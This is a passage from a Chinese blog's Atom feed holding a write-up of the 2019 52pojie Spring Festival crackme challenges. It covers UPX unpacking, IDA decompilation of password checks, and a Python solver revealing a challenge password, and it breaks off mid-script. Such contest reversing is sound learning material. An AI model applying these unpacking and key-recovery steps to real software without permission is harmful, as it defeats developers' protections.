      &lt;p&gt;翻译自&lt;a href=&quot;https://www.megabeets.net/a-journey-into-radare-2-part-2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Megabeets&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
      <category term="translation" scheme="https://qianfei11.github.io/tags/translation/"/>
    
  </entry>
  
  <entry>
    <title>2019-吾爱破解解题领红包活动-writeup</title>
    <link href="https://qianfei11.github.io/2019/02/21/2019-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8-writeup/"/>
    <id>https://qianfei11.github.io/2019/02/21/2019-吾爱破解解题领红包活动-writeup/</id>
    <published>2019-02-21T12:33:03.000Z</published>
    <updated>2019-02-27T02:25:41.122Z</updated>
    
    <content type="html"><![CDATA[<p>做了点简单的题目。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>扫码关注即可。</p><p><img src="/pics/2019-吾爱破解解题领红包活动/1.jpg" alt="第一关口令"></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳是upx，ESP定律法找到OEP脱壳。然后放进ida里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HWND <span class="title">main_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HWND result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *input; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *key; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> enc_1; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> enc_2; <span class="comment">// [esp+4h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> enc_3; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> enc_4; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = GetDlgItem(<span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( GetWindowTextLengthA(result) == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      input = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x11</span>u);</span><br><span class="line">      key = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x11</span>u);</span><br><span class="line">      *(_DWORD *)input = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)input + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">      input[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)key = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">      *((_DWORD *)key + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">      key[<span class="number">16</span>] = <span class="number">0</span>;</span><br><span class="line">      GetDlgItemTextA(<span class="number">0</span>, <span class="number">1000</span>, input, <span class="number">17</span>);</span><br><span class="line">      enc_3 = 'udhY';</span><br><span class="line">      enc_1 = 'ssdH';</span><br><span class="line">      enc_2 = 'zhNb';</span><br><span class="line">      enc_4 = '9102';</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      encrypt((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;enc_1, (<span class="keyword">int</span>)key, <span class="number">3</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(key, input) )</span><br><span class="line">        result = (HWND)MessageBoxA(<span class="number">0</span>, aOye, Caption, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result = (HWND)MessageBoxA(<span class="number">0</span>, aAuey, Caption, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (HWND)MessageBoxA(<span class="number">0</span>, &amp;Text, Caption, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下来应该就是把16位的<code>enc</code>加密了一下，然后和<code>input</code>比较。看看<code>encrypt()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *enc, <span class="keyword">int</span> key, <span class="keyword">int</span> num_3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *enc_0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> length; <span class="comment">// kr04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> c; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> alphabet[<span class="number">29</span>]; <span class="comment">// [esp+Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> tmp; <span class="comment">// [esp+30h] [ebp+8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;alphabet[<span class="number">1</span>], <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !key )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  enc_0 = enc;</span><br><span class="line">  <span class="keyword">if</span> ( !enc )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( num_3 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  length = <span class="built_in">strlen</span>(enc) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)(length - <span class="number">1</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v5 = key - (_DWORD)enc;</span><br><span class="line">  tmp = alphabet[num_3 + <span class="number">1</span>];</span><br><span class="line">  i = length - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    c = *enc_0;</span><br><span class="line">    <span class="keyword">if</span> ( *enc_0 &lt; tmp || c &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( c &gt;= <span class="number">97</span> &amp;&amp; c &lt;= alphabet[num_3] )</span><br><span class="line">        c = c - num_3 + <span class="number">26</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      c -= num_3;</span><br><span class="line">    &#125;</span><br><span class="line">    (enc_0++)[v5] = c;</span><br><span class="line">    --i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( i );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是对字符串判断是否为字母，然后根据字母表<code>alphabet</code>做映射和加减。正向实现一下脚本就得到口令了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = (<span class="string">'9102'</span> + <span class="string">'udhY'</span> + <span class="string">'zhNb'</span> + <span class="string">'ssdH'</span>)[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> enc</span><br><span class="line">alpha = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">num = <span class="number">3</span></span><br><span class="line">t = alpha[num + <span class="number">1</span>]</span><br><span class="line">i = len(enc)</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">    c = enc[j]</span><br><span class="line">    <span class="keyword">if</span> ord(c) &lt; ord(t) <span class="keyword">or</span> ord(c) &gt; <span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> ord(c) &gt;= <span class="number">97</span> <span class="keyword">and</span> ord(c) &lt;= ord(alpha[num]):</span><br><span class="line">            c = chr(ord(c) - num + <span class="number">26</span>)</span><br><span class="line">            <span class="keyword">if</span> ord(c) &gt; ord(alpha[<span class="number">-1</span>]):</span><br><span class="line">                c = chr(ord(c) - <span class="number">26</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = chr(ord(c) - num)</span><br><span class="line">    res += c</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line"><span class="comment"># HappyNewYear2019</span></span><br></pre></td></tr></table></figure><p><img src="/pics/2019-吾爱破解解题领红包活动/2.jpg" alt="第二关口令"></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这道题我查了壳然后不会脱就一直没做。看了<a href="https://mp.weixin.qq.com/s/R_mWqg2yt1HYkWq4CVbOPg" target="_blank" rel="noopener">writeup</a>居然是直接进ida就分析了。搜索到main函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST04_4</span></span><br><span class="line">  _DWORD *v4; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// ST0C_1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+0h] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+4h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+4h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+8h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+Ch] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+10h] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [esp+14h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v26; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [esp+1Ch] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [esp+1Ch] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [esp+20h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// [esp+24h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+28h] [ebp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+2Ch] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+2Ch] [ebp-50h]</span></span><br><span class="line">  _DWORD *v35; <span class="comment">// [esp+30h] [ebp-4Ch]</span></span><br><span class="line">  _DWORD *v36; <span class="comment">// [esp+34h] [ebp-48h]</span></span><br><span class="line">  _DWORD *v37; <span class="comment">// [esp+38h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> *v38; <span class="comment">// [esp+3Ch] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v39; <span class="comment">// [esp+40h] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v40; <span class="comment">// [esp+44h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">void</span> *v41; <span class="comment">// [esp+48h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v42; <span class="comment">// [esp+4Ch] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> *v43; <span class="comment">// [esp+50h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// [esp+54h] [ebp-28h]</span></span><br><span class="line">  _DWORD *v45; <span class="comment">// [esp+58h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> *v46; <span class="comment">// [esp+5Ch] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *v47; <span class="comment">// [esp+60h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v48; <span class="comment">// [esp+64h] [ebp-18h]</span></span><br><span class="line">  _DWORD *v49; <span class="comment">// [esp+68h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> *v50; <span class="comment">// [esp+6Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v51; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v52; <span class="comment">// [esp+74h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v53; <span class="comment">// [esp+78h] [ebp-4h]</span></span><br><span class="line">  <span class="keyword">void</span> *retaddr; <span class="comment">// [esp+7Ch] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(<span class="number">0x14</span>u) + <span class="number">8</span>) )</span><br><span class="line">    runtime_morestack_noctxt();</span><br><span class="line">  v52 = dword_4A04E0;</span><br><span class="line">  v53 = &amp;main_statictmp_0;</span><br><span class="line">  fmt_Println(&amp;v52, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  runtime_newobject(dword_4A04E0, v0);</span><br><span class="line">  v36 = v1;</span><br><span class="line">  runtime_newobject(dword_4A04E0, v1);</span><br><span class="line">  v37 = v2;</span><br><span class="line">  v50 = dword_4A04E0;</span><br><span class="line">  v51 = &amp;main_statictmp_1;</span><br><span class="line">  fmt_Print(&amp;v50, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v48 = dword_498EE0;</span><br><span class="line">  v49 = v36;</span><br><span class="line">  fmt_Scanln(&amp;v48, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v46 = dword_4A04E0;</span><br><span class="line">  v47 = &amp;main_statictmp_2;</span><br><span class="line">  fmt_Print(&amp;v46, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v44 = dword_498EE0;</span><br><span class="line">  v45 = v37;</span><br><span class="line">  fmt_Scanln(&amp;v44, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  runtime_newobject(dword_4A90C0, v3);</span><br><span class="line">  v35 = v4;</span><br><span class="line">  *v4 = <span class="number">1732584193</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">-271733879</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">-1732584194</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">271733878</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">-1009589776</span>;</span><br><span class="line">  v4[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">22</span>] = <span class="number">0</span>;</span><br><span class="line">  v4[<span class="number">23</span>] = <span class="number">0</span>;</span><br><span class="line">  runtime_stringtoslicebyte(<span class="number">0</span>, *v36, v36[<span class="number">1</span>]);</span><br><span class="line">  crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22);</span><br><span class="line">  crypto_sha1___digest__Sum(v35, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v5, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v26 &lt; <span class="number">0x10</span> )</span><br><span class="line">    runtime_panicslice(</span><br><span class="line">      v11,</span><br><span class="line">      v12,</span><br><span class="line">      v14,</span><br><span class="line">      v16,</span><br><span class="line">      v20,</span><br><span class="line">      v23,</span><br><span class="line">      v26,</span><br><span class="line">      v28,</span><br><span class="line">      v30,</span><br><span class="line">      v31,</span><br><span class="line">      v32,</span><br><span class="line">      v33,</span><br><span class="line">      v35,</span><br><span class="line">      v36,</span><br><span class="line">      v37,</span><br><span class="line">      v38,</span><br><span class="line">      v39,</span><br><span class="line">      v40,</span><br><span class="line">      v41,</span><br><span class="line">      v42,</span><br><span class="line">      v43,</span><br><span class="line">      v44,</span><br><span class="line">      v45,</span><br><span class="line">      v46,</span><br><span class="line">      v47,</span><br><span class="line">      v48,</span><br><span class="line">      v49,</span><br><span class="line">      v50,</span><br><span class="line">      v51,</span><br><span class="line">      v52,</span><br><span class="line">      v53);</span><br><span class="line">  v34 = v20;</span><br><span class="line">  encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[<span class="number">1</span>], v16, v20, v23, v26);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = dword_4A04E0;</span><br><span class="line">    v43 = &amp;main_statictmp_3;</span><br><span class="line">    result = fmt_Println(&amp;v42, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    main_AesDecrypt(v17, v21, v24, v34, <span class="number">16</span>, <span class="number">16</span>, <span class="number">0</span>, v28);</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      v40 = dword_4A04E0;</span><br><span class="line">      v41 = &amp;main_statictmp_4;</span><br><span class="line">      result = fmt_Println(&amp;v40, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v29 == <span class="number">26</span> &amp;&amp; (runtime_memequal(v27, dword_4B8A80, <span class="number">26</span>, v18), v10) )</span><br><span class="line">        fmt_Printf(dword_4BCC04, <span class="number">73</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v25, v27, <span class="number">26</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        fmt_Printf(&amp;word_4B84CE, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v25, v27, v29);</span><br><span class="line">      runtime_newobject(dword_4A04E0, v13);</span><br><span class="line">      v38 = dword_498EE0;</span><br><span class="line">      v39 = v8;</span><br><span class="line">      result = fmt_Scanln(&amp;v38, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概可以推测，先进行base64，然后aes解密，最后和数据段中一串长度为26的字符串比较。具体字符串我们可以dump出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">0x48</span>, <span class="number">0x61</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x59</span>, <span class="number">0x65</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x46</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x50</span>, <span class="number">0x6F</span>, <span class="number">0x4A</span>, <span class="number">0x69</span>, <span class="number">0x65</span>, <span class="number">0x2E</span>, <span class="number">0x43</span>, <span class="number">0x6E</span>, <span class="number">0x4C</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x73</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x73</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x69</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x4E</span>, <span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x66</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0x6E</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x69</span>]</span><br><span class="line">output = <span 